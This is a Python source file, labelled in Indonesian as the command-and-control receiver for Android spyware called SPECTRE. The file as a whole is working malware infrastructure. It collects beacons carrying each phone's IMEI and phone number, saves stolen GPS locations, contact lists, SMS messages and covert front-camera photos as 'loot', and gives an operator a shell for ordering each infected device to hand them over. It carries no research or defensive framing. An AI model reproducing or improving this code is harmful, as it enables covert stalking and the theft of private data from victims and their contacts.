#!/usr/bin/env python3
# SPECTRE C2 — receiver untuk Android spyware
# python3 spy_output/spectre_c2.py
import socket, threading, json, os, base64, sys
from datetime import datetime

HOST = "0.0.0.0"
PORT = 4445
LOOT = "spectre_loot"
os.makedirs(LOOT, exist_ok=True)

R="[91m"; G="[92m"; Y="[93m"; C="[96m"; M="[95m"; RST="[0m"; D="[90m"

agents = {}
lock   = threading.Lock()

def log(msg, color=C): print(f"  {color}{msg}{RST}")

def save_loot(aid, fname, data_b64):
    d = os.path.join(LOOT, aid.replace(":","_"))
    os.makedirs(d, exist_ok=True)
    path = os.path.join(d, fname)
    with open(path,"wb") as f:
        f.write(base64.b64decode(data_b64))
    log(f"[SAVED] {path}", Y)
    return path

def handle(conn, addr):
    aid = f"{addr[0]}:{addr[1]}"
    buf = b""
    log(f"[CONN] {aid}", G)
    try:
        while True:
            chunk = conn.recv(65535)
            if not chunk: break
            buf += chunk
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                if not line.strip(): continue
                try:
                    pkt = json.loads(line.strip())
                except: continue
                t = pkt.get("type","")

                if t == "beacon":
                    with lock: agents[aid] = {"sock":conn,"info":pkt,"addr":addr}
                    log(f"[BEACON] {aid}", M)
                    log(f"  Model: {pkt.get('model','?')} | Android: {pkt.get('android','?')}", D)
                    log(f"  IMEI: {pkt.get('imei','?')} | Phone: {pkt.get('phone','?')}", D)

                elif t == "gps":
                    lat, lon = pkt.get("lat"), pkt.get("lon")
                    log(f"[GPS] {aid} → lat={lat} lon={lon}", Y)
                    log(f"  Maps: https://maps.google.com/?q={lat},{lon}", C)
                    d = os.path.join(LOOT, aid.replace(":","_"))
                    os.makedirs(d, exist_ok=True)
                    with open(os.path.join(d,"gps.txt"),"a") as f:
                        f.write(f"{datetime.now()} lat={lat} lon={lon}\n")

                elif t == "contacts":
                    contacts = pkt.get("data",[])
                    log(f"[CONTACTS] {aid} → {len(contacts)} entries", Y)
                    d = os.path.join(LOOT, aid.replace(":","_"))
                    os.makedirs(d, exist_ok=True)
                    with open(os.path.join(d,"contacts.json"),"w") as f:
                        json.dump(contacts, f, indent=2, ensure_ascii=False)
                    for c in contacts[:5]:
                        log(f"  {c.get('name','?')} — {c.get('num','?')}", D)

                elif t == "sms":
                    msgs = pkt.get("data",[])
                    log(f"[SMS] {aid} → {len(msgs)} messages", Y)
                    d = os.path.join(LOOT, aid.replace(":","_"))
                    os.makedirs(d, exist_ok=True)
                    with open(os.path.join(d,"sms.json"),"w") as f:
                        json.dump(msgs, f, indent=2, ensure_ascii=False)
                    for m in msgs[:3]:
                        log(f"  FROM: {m.get('from','?')}  {m.get('body','')[:60]}", D)

                elif t == "photo":
                    ts = datetime.now().strftime("%H%M%S")
                    save_loot(aid, f"photo_{ts}.jpg", pkt.get("data",""))

                elif t == "pong":
                    log(f"[PONG] {aid}", D)

    except Exception as e:
        pass
    finally:
        with lock: agents.pop(aid, None)
        conn.close()
        log(f"[DISC] {aid}", R)

def send_cmd(aid, cmd_dict):
    a = agents.get(aid)
    if not a: log(f"Agent {aid} not found", R); return
    try:
        a["sock"].sendall((json.dumps(cmd_dict)+"\n").encode())
    except Exception as e:
        log(f"Send error: {e}", R)

def menu():
    print(f"\n{M}[SPECTRE C2]{RST} {HOST}:{PORT}")
    while True:
        try:
            c = input(f"\n{M}SPECTRE{RST} » ").strip()
            if not c: continue

            if c == "list":
                if not agents: log("No agents", R); continue
                for i,(k,v) in enumerate(agents.items()):
                    inf = v.get("info",{})
                    log(f"[{i}] {k} | {inf.get('model','?')} Android {inf.get('android','?')}", G)

            elif c.startswith("use "):
                idx = int(c[4:])
                aid = list(agents.keys())[idx]
                log(f"[SESSION] {aid} — type 'help' for commands", Y)
                while True:
                    try:
                        inp = input(f"{R}{aid}{RST} $ ").strip()
                        if inp == "back": break
                        elif inp == "help":
                            print(f"""
  location  → request GPS coords
  contacts  → dump all contacts
  sms       → dump SMS inbox
  photo     → take front camera photo
  ping      → check alive""")
                        elif inp in ("location","contacts","sms","photo","ping"):
                            send_cmd(aid, {"cmd": inp})
                            log(f"Sent: {inp}", C)
                        else:
                            log("Unknown. Type 'help'", R)
                    except KeyboardInterrupt: break

            elif c in ("exit","quit"): sys.exit(0)
            elif c == "loot":
                for d in os.listdir(LOOT):
                    full = os.path.join(LOOT,d)
                    if os.path.isdir(full):
                        files = os.listdir(full)
                        log(f"  {d}/ — {len(files)} files", Y)
            else:
                log("Commands: list · use <n> · loot · exit", D)

        except (KeyboardInterrupt, EOFError):
            print(); break

srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind((HOST, PORT))
srv.listen(20)
print(f"{G}[SPECTRE C2]{RST} Listening {HOST}:{PORT}")
threading.Thread(target=lambda: [handle(*srv.accept()) for _ in iter(int,1)], daemon=True).start()
menu()
